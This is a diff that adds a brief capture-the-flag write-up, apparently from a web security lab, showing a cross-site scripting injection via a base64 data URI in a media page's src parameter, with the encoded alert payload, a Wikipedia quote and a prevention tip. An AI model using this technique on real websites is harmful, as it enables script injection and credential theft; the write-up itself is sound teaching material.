@@ -1,0 +1,20 @@
+On home page we can see that the nsa_prism.png is inside a link. 
+If we click on the image we can see a page with a GET request with this :
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+
+So apparently we can send text/html, so we try :
+
+We base64 the following :
+<script>alert("coucou");</script>
+-> PHNjcmlwdD5hbGVydCgiY291Y291Iik7PC9zY3JpcHQ+
+
+http://local_IP/?page=media&src=data:text/html;base64PHNjcmlwdD5hbGVydCgiY291Y291Iik7PC9zY3JpcHQ+
+
+and we get the flag.
+
+From wikipedia : 
+
+"The data URI can be utilized to construct attack pages that attempt to obtain usernames and passwords from unsuspecting web users.
+It can also be used to get around cross-site scripting (XSS) restrictions, embedding the attack payload fully inside the address bar."
+
+To prevent you can escape data and use a proper input validation before actually use that data.
